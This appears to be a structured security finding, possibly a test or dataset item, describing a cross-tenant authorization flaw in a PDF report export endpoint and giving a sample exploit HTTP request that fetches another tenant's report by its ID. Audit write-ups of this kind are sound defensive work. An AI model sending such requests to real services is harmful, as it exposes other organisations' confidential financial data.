diagnosis: The PDF export endpoint queries generated_reports strictly by reportId and uses headless Puppeteer with internal service credentials to render the document. Because the SQL query does not scope the record to req.user.tenant_id, an authenticated tenant can supply any reportId to generate and download confidential financial reports belonging to other tenants.
exploit_request:
POST /api/reports/export-pdf HTTP/1.1
Host: api.enterprise-analytics.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "reportId": "8fa3c004-9218-4e5c-bd63-c78201de9821"
}
